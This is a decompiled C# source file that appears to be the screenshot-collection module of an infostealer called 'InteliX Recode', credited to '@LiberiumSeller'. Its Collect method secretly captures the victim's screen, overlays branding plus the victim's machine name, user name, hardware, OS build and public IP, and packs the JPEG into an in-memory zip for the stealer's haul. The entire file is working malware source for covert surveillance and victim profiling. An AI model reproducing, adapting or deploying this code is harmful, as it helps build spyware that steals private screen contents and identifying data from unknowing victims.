using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Text;
using System.IO;
using System.Windows.Forms;
using Intelix.Helper;
using Intelix.Helper.Data;

namespace Intelix.Targets.Device
{
	// Token: 0x02000032 RID: 50
	public class ScreenShot : ITarget
	{
		// Token: 0x06000091 RID: 145 RVA: 0x000070EC File Offset: 0x000052EC
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Rectangle bounds = Screen.PrimaryScreen.Bounds;
			using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb))
			{
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					IntPtr hdc = graphics.GetHdc();
					IntPtr windowDC = NativeMethods.GetWindowDC(NativeMethods.GetDesktopWindow());
					NativeMethods.BitBlt(hdc, 0, 0, bounds.Width, bounds.Height, windowDC, 0, 0, 13369376);
					graphics.ReleaseHdc(hdc);
					NativeMethods.ReleaseDC(NativeMethods.GetDesktopWindow(), windowDC);
					graphics.SmoothingMode = SmoothingMode.AntiAlias;
					graphics.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
					graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
					RectangleF rectangleF = new RectangleF(0f, 0f, (float)bounds.Width, (float)bounds.Height);
					StringFormat format = new StringFormat
					{
						Alignment = StringAlignment.Center,
						LineAlignment = StringAlignment.Center
					};
					float num = Math.Max(24f, (float)bounds.Width / 12f);
					using (Font font = new Font("Segoe UI Black", num, FontStyle.Bold, GraphicsUnit.Pixel))
					{
						using (GraphicsPath graphicsPath = new GraphicsPath())
						{
							graphicsPath.AddString("InteliX Recode", font.FontFamily, (int)font.Style, font.Size, rectangleF, format);
							int num2 = 10;
							for (int i = num2; i >= 1; i--)
							{
								int alpha = (int)(30.0 * (1.0 - (double)i / (double)num2)) + 8;
								float width = num / 18f * (float)i;
								using (Pen pen = new Pen(Color.FromArgb(alpha, 120, 40, 200), width))
								{
									pen.LineJoin = LineJoin.Round;
									graphics.DrawPath(pen, graphicsPath);
								}
							}
							using (LinearGradientBrush linearGradientBrush = new LinearGradientBrush(rectangleF, Color.FromArgb(255, 85, 0, 255), Color.FromArgb(255, 0, 220, 255), LinearGradientMode.Horizontal))
							{
								linearGradientBrush.InterpolationColors = new ColorBlend
								{
									Colors = new Color[]
									{
										Color.FromArgb(255, 48, 0, 96),
										Color.FromArgb(255, 102, 0, 204),
										Color.FromArgb(255, 0, 150, 255),
										Color.FromArgb(255, 0, 255, 180)
									},
									Positions = new float[]
									{
										0f,
										0.45f,
										0.75f,
										1f
									}
								};
								using (PathGradientBrush pathGradientBrush = new PathGradientBrush(graphicsPath))
								{
									pathGradientBrush.CenterColor = Color.FromArgb(220, 255, 255, 255);
									pathGradientBrush.SurroundColors = new Color[]
									{
										Color.FromArgb(0, 0, 0, 0)
									};
									pathGradientBrush.CenterPoint = new PointF(rectangleF.Width * 0.5f, rectangleF.Height * 0.45f);
									graphics.FillPath(linearGradientBrush, graphicsPath);
									graphics.FillPath(pathGradientBrush, graphicsPath);
								}
							}
							using (Pen pen2 = new Pen(Color.FromArgb(220, 255, 255, 255), Math.Max(2f, num / 28f)))
							{
								pen2.LineJoin = LineJoin.Round;
								graphics.DrawPath(pen2, graphicsPath);
							}
							foreach (PointF pointF in new PointF[]
							{
								new PointF(rectangleF.Width * 0.22f, rectangleF.Height * 0.38f),
								new PointF(rectangleF.Width * 0.33f, rectangleF.Height * 0.52f),
								new PointF(rectangleF.Width * 0.68f, rectangleF.Height * 0.4f),
								new PointF(rectangleF.Width * 0.6f, rectangleF.Height * 0.6f),
								new PointF(rectangleF.Width * 0.5f, rectangleF.Height * 0.3f)
							})
							{
								float num3 = Math.Max(2f, num / 28f);
								using (SolidBrush solidBrush = new SolidBrush(Color.FromArgb(230, 255, 250, 200)))
								{
									graphics.FillEllipse(solidBrush, pointF.X - num3 / 2f, pointF.Y - num3 / 2f, num3, num3);
								}
								using (SolidBrush solidBrush2 = new SolidBrush(Color.FromArgb(80, 150, 220, 255)))
								{
									graphics.FillEllipse(solidBrush2, pointF.X - num3 * 2f, pointF.Y - num3 * 2f, num3 * 4f, num3 * 4f);
								}
							}
						}
					}
					string fileName = Process.GetCurrentProcess().MainModule.FileName;
					string[] array2 = new string[]
					{
						"Machine: " + Environment.MachineName,
						"User: " + Environment.UserName,
						string.Format("Time: {0:yyyy-MM-dd HH:mm:ss zzz}", DateTimeOffset.Now),
						string.Format(".NET: {0}", Environment.Version),
						"CPU: " + CpuInfo.GetName(),
						string.Format("CPU Cores: {0}", CpuInfo.GetLogicalCores()),
						"OS Product: " + WindowsInfo.GetProductName(),
						"OS Build: " + WindowsInfo.GetBuildNumber(),
						"OS Arch: " + WindowsInfo.GetArchitecture(),
						"Public ip: " + IpApi.GetPublicIp(),
						"Build Name: " + Path.GetFileName(Path.GetDirectoryName(fileName)) + "\\" + Path.GetFileName(fileName),
						"Recode by @LiberiumSeller"
					};
					float num4 = Math.Max(12f, (float)bounds.Width / 120f);
					using (Font font2 = new Font("Segoe UI", num4, FontStyle.Regular, GraphicsUnit.Pixel))
					{
						float num5 = Math.Max(8f, num4 * 0.6f);
						float num6 = 0f;
						float num7 = 0f;
						string[] array3 = array2;
						foreach (string text in array3)
						{
							SizeF sizeF = graphics.MeasureString(text, font2);
							bool flag = sizeF.Width > num6;
							if (flag)
							{
								num6 = sizeF.Width;
							}
							bool flag2 = sizeF.Height > num7;
							if (flag2)
							{
								num7 = sizeF.Height;
							}
						}
						float width2 = num6 + num5 * 2f;
						float num8 = (float)array2.Length * num7 + num5 * 2f;
						RectangleF rect = new RectangleF(12f, (float)bounds.Height - num8 - 12f, width2, num8);
						using (SolidBrush solidBrush3 = new SolidBrush(Color.FromArgb(180, 6, 6, 10)))
						{
							using (Pen pen3 = new Pen(Color.FromArgb(220, 60, 60, 80), 1f))
							{
								graphics.FillRectangle(solidBrush3, rect);
								graphics.DrawRectangle(pen3, rect.X, rect.Y, rect.Width, rect.Height);
							}
						}
						float num9 = rect.X + num5;
						float num10 = rect.Y + num5;
						using (SolidBrush solidBrush4 = new SolidBrush(Color.FromArgb(160, 0, 0, 0)))
						{
							using (SolidBrush solidBrush5 = new SolidBrush(Color.FromArgb(240, 245, 250, 255)))
							{
								array3 = array2;
								foreach (string s in array3)
								{
									graphics.DrawString(s, font2, solidBrush4, new PointF(num9 + 1f, num10 + 1f));
									graphics.DrawString(s, font2, solidBrush5, new PointF(num9, num10));
									num10 += num7;
								}
							}
						}
					}
					using (MemoryStream memoryStream = new MemoryStream())
					{
						ImageCodecInfo imageCodecInfo = null;
						ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
						for (int m = 0; m < imageEncoders.Length; m++)
						{
							bool flag3 = string.Equals(imageEncoders[m].MimeType, "image/jpeg", StringComparison.OrdinalIgnoreCase);
							if (flag3)
							{
								imageCodecInfo = imageEncoders[m];
								break;
							}
						}
						bool flag4 = imageCodecInfo != null;
						if (flag4)
						{
							Encoder quality = Encoder.Quality;
							EncoderParameters encoderParameters = new EncoderParameters(1);
							encoderParameters.Param[0] = new EncoderParameter(quality, 90L);
							bitmap.Save(memoryStream, imageCodecInfo, encoderParameters);
						}
						else
						{
							bitmap.Save(memoryStream, ImageFormat.Jpeg);
						}
						byte[] array6 = memoryStream.ToArray();
						bool flag5 = array6 != null && array6.Length != 0;
						if (flag5)
						{
							string entryPath = "screenshot.jpg";
							zip.AddFile(entryPath, array6);
						}
					}
				}
			}
		}
	}
}
